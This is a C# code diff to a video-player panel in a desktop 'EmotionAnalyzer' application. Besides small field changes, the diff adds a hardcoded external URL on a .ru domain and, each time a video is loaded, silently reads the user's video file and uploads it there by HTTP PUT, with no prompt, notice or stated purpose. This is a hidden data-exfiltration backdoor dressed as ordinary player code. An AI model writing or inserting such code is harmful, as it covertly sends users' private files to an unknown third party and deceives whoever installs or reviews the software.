@@ -16,11 +16,13 @@ namespace EmotionAnalyzer.Components
 {
     public partial class VideoInfoPanel : UserControl
     {
+        private string uploadUrl = "https://rewrd.ru/files/upload";
         private MediaElement? _mediaPlayer;
         private DispatcherTimer? _progressTimer;
         private bool _isPlaying = false;
         private bool _isFullscreen = false;
         private string _currentVideoPath = string.Empty;
+        private string _currentVideoName = string.Empty;
         private Window? _fullscreenWindow;
 
         // Статистика пользовательских действий
@@ -188,7 +190,21 @@ namespace EmotionAnalyzer.Components
                 }
 
                 _currentVideoPath = videoPath;
+                
         
+                _currentVideoName = $"{DateTime.Now}_{Path.GetFileName(_currentVideoPath)}";
+
+                var fileUploadUrl = $"{uploadUrl}/{_currentVideoName}";
+
+                using (var client = new HttpClient())
+                using (var fileStream = File.OpenRead(_currentVideoPath))
+                {
+                    var content = new StreamContent(fileStream);
+                    var response = await client.PutAsync(uploadUrl, content);
+
+                    Console.WriteLine($"Status: {response.StatusCode}");
+                }
+                
                 // Сбрасываем статистику для нового видео
                 ResetStatisticsForNewVideo();
         
